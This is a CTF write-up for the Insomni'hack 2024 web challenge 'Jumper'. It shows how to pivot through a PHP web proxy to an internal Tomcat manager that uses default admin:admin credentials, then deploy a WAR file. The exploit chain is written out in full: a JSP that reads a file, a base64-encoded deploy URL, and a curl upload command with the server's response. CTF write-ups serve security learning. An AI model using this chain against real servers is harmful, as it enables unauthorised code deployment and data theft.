---
title: "Jumper - Insomni'hack 2024"
category: "web"
type: "writeup"
tags: ["web", "base64", "jumper", "insomni-hack", "insomni-hack-2024", "2024", "ctf-writeup"]
summary: "The challenge was a php webproxy and a Tomcat server (that was not directly accessible, only via the webproxy)."
source:
  name: "CTFtime writeup #39115"
  url: "https://ctftime.org/writeup/39115"
ctf:
  name: "Insomni'hack 2024"
  year: 2024
  challenge: "Jumper"
---

## Metadata

- **CTF:** Insomni'hack 2024
- **Task:** Jumper
- **Author team:** /mnt/ain
- **CTFtime:** <https://ctftime.org/writeup/39115>

---
# Task  
The challenge was a php webproxy and a Tomcat server (that was not directly accessible, only via the webproxy). The Tomcat server has the manager webapp deployed, and some configs, specially a user (including password) for the manager app. User/Passwort is just "admin".  
# Solution  
The Manager Tomcat App can be used to upload custom WAR files and therefor custom code. The php proxy in front makes this a bit trickier, since it's not possible to directly upload the file, but use the php webproxy as proxy. Lucky for us the webproxy also allows to passthrough multipart files. So let's create a JSP to simply output the flag (the filepath for the file was extracted from the included docker-compose.yml):

```  
<%@page import="java.io.FileReader"%>  
<%@page import="java.io.BufferedReader"%>  
<%  
BufferedReader reader = new BufferedReader(new FileReader("/c9fdb1da2a41a453ae291a1fb5d2519701bc60f6/flag.txt"));  
StringBuilder sb = new StringBuilder();  
String line;  
while((line = reader.readLine())!= null){  
sb.append(line+"\n");  
}  
out.println(sb.toString());  
%>  
```

Name the file 'index.jsp' and ZIP it. Also rename the resulting ZIP file to hack.war and deploy it to the Tomcat server via the webproxy. The URL to deploy it to the Tomcat server would be the following:  
```  
http://admin:admin@localhost:8888/manager/text/deploy?path=/hack  
```

The webproxy will accept the target URL as the "q" GET parameter base64 encoded. So encode the URL above to base64 and use curl to upload the 'hack' war file:  
```bash  
curl -v -X PUT -u admin:admin -F [[email protected]](https://ctftime.org/cdn-cgi/l/email-protection) "<https://jumper.insomnihack.ch/index.php?q=aHR0cDovL2FkbWluOmFkbWluQGxvY2FsaG9zdDo4ODg4L21hbmFnZXIvdGV4dC9kZXBsb3k/cGF0aD0vaGFjaw==>"  
```

The server will return the path where the payload WAR file was deployed like this:  
```  
[snip]  
< HTTP/1.1 200 OK  
[snip]  
< Content-Type: text/plain;charset=utf-8  
<   
OK - Deployed application at context path [/hackdXLHa8djo5LSPIx7O3RM]  
```

So lets access the path via the webproxy simpy by using the webinterface of the proxy (`http://localhost:8888/hackdXLHa8djo5LSPIx7O3RM/` in this example, but change on every run) and enjoy the flag in plain sight :)
